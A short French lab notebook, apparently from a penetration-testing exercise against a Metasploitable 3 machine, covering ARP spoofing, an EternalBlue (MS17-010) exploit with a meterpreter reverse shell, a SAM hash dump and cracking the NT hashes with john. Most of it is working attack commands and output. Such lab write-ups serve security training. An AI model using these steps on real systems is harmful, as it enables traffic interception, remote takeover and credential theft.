# MITM

Faire un __arp spoofing__ :

Configurer Linux pour que les paquets IP soient relayés :
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Effecture l'attaque
```bash
sudo arpspoof -t 10.10.11.28 -r 10.10.11.31
```

# Metasploitable 3

## EternalBlue (MS17-010)

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.11.31      yes       The target host(s), range CIDR identifier, or hosts file with syntax '
                                             file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.11.2       yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[...]

meterpreter >
```

## Récupérer le contenu de la base SAM

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
[...]
```

## Casser les hashs

On copie le résultat de `hashdump` dans un fichier `sam.dump`.

On peut ensuite casser les hashs avec `john`.

```bash
john sam.dump --wordlist=/usr/share/wordlists/rockyou.txt --format=NT --rules=best64
```

Une fois cassés, on peut les revoirs avec l'option `--show` :

```bash
john sam.dump --format=NT --show 
```

